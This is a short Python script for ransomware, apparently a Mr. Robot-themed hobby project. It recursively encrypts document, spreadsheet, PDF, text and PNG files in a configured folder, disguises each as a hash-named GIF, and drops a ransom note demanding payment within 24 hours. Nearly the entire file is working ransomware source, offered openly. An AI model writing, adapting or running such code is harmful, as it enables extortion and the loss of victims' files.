import glob,os,uuid,struct
import crypt
import conf

def init():
    sys_map = {}
    user_id = uuid.uuid4()
    
    res = ""
    print("Shall we start wreaking some havoc? [ y / n ]")
    while res != "y" and res != "n":
        res = input("> ")
    if res == "n":
        return
    res = ""
    print("Please make sure you know what you are doing. Procceed? [ y / n ]")
    while res != "y" and res != "n":
        res = input("> ")
    if res == "n":
        return

    for filename in glob.iglob(conf.test_folder + '**', recursive=True):
        if os.path.isfile(filename) and do_extention(filename):
            f_hash = crypt.sha256sum(filename)
            sys_map.update({filename: f_hash})

            with open(filename,'rb') as f_bytes:
                orig_file = f_bytes.read()
                cipher = crypt.encrypt(orig_file)

                with open(filename, 'wb') as enc_file:
                    enc_file.write(cipher)

                inject(filename)
                rename(filename, f_hash)
    with open("CryptoNote.txt", 'w') as note:
        note.write(str(user_id) + "\n\nHello friend, hello friend...\nYour files are encrypted!\nWant to get them back? Not a problem!\nFollow the link below - \nyouwillnevergetyourfiles.com.net.gov\nEnter your UUID and send us 45BC in the next 24 hours!\nAfter 24 hours your files can not be recovered anymore!\n\nTruly yours,\nFsociety Inc\n")


def rename(filename, f_hash):
    os.rename(filename, os.path.dirname(filename) + "/" + f_hash + ".gif")


def do_extention(filename):
    extentions = [".doc",".docx",".ppt",".pptx",".xls",".xlsx",".pdf",".txt",".png"]
    for ext in extentions:
        if filename.endswith(ext):
            return True
    return False


def inject(filename):
    old_file = ""
    with open(filename,'rb') as f_bytes:
        old_file = f_bytes.read()
    with open(filename,'wb') as f_bytes:
        with open("fsoc.gif", 'rb') as fsoc:
            f_bytes.write(fsoc.read())
            f_bytes.write(struct.pack('i', len(filename)))
            f_bytes.write(str(filename).encode())
    with open(filename,'ab') as f_bytes:
        f_bytes.write(old_file)


init()